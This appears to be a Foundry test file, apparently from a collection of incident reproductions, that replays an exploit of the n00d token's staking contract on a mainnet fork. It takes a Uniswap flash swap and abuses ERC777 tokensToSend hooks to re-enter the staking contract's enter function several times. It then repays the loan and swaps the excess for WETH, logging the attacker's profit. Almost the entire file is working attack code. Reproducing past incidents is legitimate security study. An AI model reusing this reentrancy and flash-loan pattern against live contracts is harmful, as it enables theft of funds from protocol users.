// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// Analysis
// https://twitter.com/BlockSecTeam/status/1584959295829180416
// https://twitter.com/AnciliaInc/status/1584955717877784576
// TX
// https://etherscan.io/tx/0x8037b3dc0bf9d5d396c10506824096afb8125ea96ada011d35faa89fa3893aea

interface sushiBar {
    function enter(uint256) external;
    function leave(uint256) external;
}


contract ContractTest is DSTest{
    IERC777 n00d = IERC777(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x5476DB8B72337d44A6724277083b1a927c82a389);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 Xn00d = IERC20(0x3561081260186E69369E6C32F280836554292E08);
    sushiBar Bar = sushiBar(0x3561081260186E69369E6C32F280836554292E08);
    ERC1820Registry registry = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    uint i = 0;
    uint enterAmount = 0;
    uint n00dReserve;
    
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    function setUp() public {
        cheats.createSelectFork("mainnet", 15826379);
    }

    function testExploit() public{
        emit log_named_decimal_uint(
            "At First WETH: ",
            WETH.balanceOf(address(this)),
            18
        );

        registry.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));
        registry.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        

        //registry.setInterfaceImplementer(address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this));
        
        
        n00d.approve(address(Bar), type(uint).max);
        (n00dReserve, , ) = Pair.getReserves();
        Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "After Swap done: ",
            n00d.balanceOf(address(this)),
            18
        );

        uint amountIn = n00d.balanceOf(address(this));
        (uint n00dR, uint WETHR, ) = Pair.getReserves();
        uint amountOut = amountIn * 997 * WETHR / (amountIn * 997 + n00dR * 1000);
        n00d.transfer(address(Pair), amountIn);
        Pair.swap(0, amountOut, address(this), "");

        emit log_named_decimal_uint(
            "Attacker WETH profit after exploit",
            WETH.balanceOf(address(this)),
            18
        );
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public{

        emit log_named_decimal_uint(
            "uniswapV2Call callback: ",
            n00d.balanceOf(address(this)),
            18
        );

        enterAmount = n00d.balanceOf(address(this)) / 5;
        Bar.enter(enterAmount);


        Bar.leave(Xn00d.balanceOf(address(this)));
        n00d.transfer(address(Pair), n00dReserve * 1000 / 997 + 1000);
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if(to == address(Bar) && i < 4){
            emit log_named_decimal_uint(
                "tokensToSend: ",
                Xn00d.balanceOf(address(this)),
                18
            );

            i++;
            Bar.enter(enterAmount);
        }
    }
    

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        emit log_named_decimal_uint(
            "tokensReceived: ",
            n00d.balanceOf(address(this)),
            18
        );
    }


}